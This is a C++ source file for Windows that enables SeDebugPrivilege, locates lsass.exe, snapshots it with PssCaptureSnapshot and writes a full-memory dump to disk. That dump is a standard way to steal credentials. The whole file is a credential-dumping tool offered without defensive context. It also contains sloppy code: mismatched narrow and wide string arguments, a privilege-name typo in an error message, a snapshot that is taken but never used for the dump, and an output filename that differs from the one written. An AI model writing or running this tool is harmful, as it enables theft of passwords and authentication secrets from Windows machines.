#include<Windows.h>
#include<TlHelp32.h>
#include<iostream>
#include<ProcessSnapshot.h>
#include<DbgHelp.h>

#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"kernel32.lib")

using namespace std;

bool EnablePrivilege(LPCSTR privName){
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
        return false;
    if(!LookupPrivilegeValue(NULL,privName,&luid))
        return false;
    
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        return AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
}
DWORD GetLsassPID(){
    PROCESSENTRY32 pe  = { sizeof(PROCESSENTRY32) };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(Process32First(hSnap,&pe)){
        do{
            if(wcsicmp(pe.szExeFile,L"lsass.exe") == 0){
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        }while(Process32Next(hSnap,&pe));
    }
      CloseHandle(hSnap);
        return 0;
}
int main(){
    cout << "[+] Starting Lsass snapshot dump using PssCaptureSnapShot...\n";

    if(!EnablePrivilege(L"SeDebugPrivilege")){
        cerr << "Failed to enable SeDubugPrivilege" << endl;
        return 1;
    }
    DWORD lsassPid = GetLsassPID();
    if(!lsassPid){
        cerr << "Failed to acquire lsass.exe pid" << endl;
        return 1;
    }
    HANDLE HLsass = OpenProcess(PROCESS_ALL_ACCESS,0,lsassPid);
    if(!HLsass){
        cerr << "Failed to open lsass.exe process with privileges" << endl;;
        return 1;
    }
    HPSS snapshotHandle = nullptr;
    DWORD status = PssCaptureSnapshot(
        HLsass,
        PSS_CAPTURE_VA_CLONE |PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_THREAD_CONTEXT|PSS_CAPTURE_THREADS,
        CONTEXT_ALL,
        &snapshotHandle
    );
    if(status != ERROR_SUCCESS){
        cerr << "Failed to Capture SnapShot of the lsass.exe dump" << endl;
        CloseHandle(HLsass);
        return 1;
    }
    HANDLE hFile = CreateFileW("lsass_dump.dmp",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if(hFile == INVALID_HANDLE_VALUE){
        cerr << "Failed to create file" << endl;
        PssFreeSnapshot(GetCurrentProcess(),snapshotHandle);
        CloseHandle(hFile);
        return 1;
    }
    bool dumped = MiniDumpWriteDump(
        HLsass,lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );
    if(!dumped){
        cerr << "Failed to write dump to the File" << endl;
    }else{
        cout << "[+] Memory Dump Written successfully to lsass_pss.dmp" << endl;
    }
    CloseHandle(hFile);
    PssFreeSnapshot(GetCurrentProcess(),snapshotHandle);
    CloseHandle(HLsass);

    return 0;

}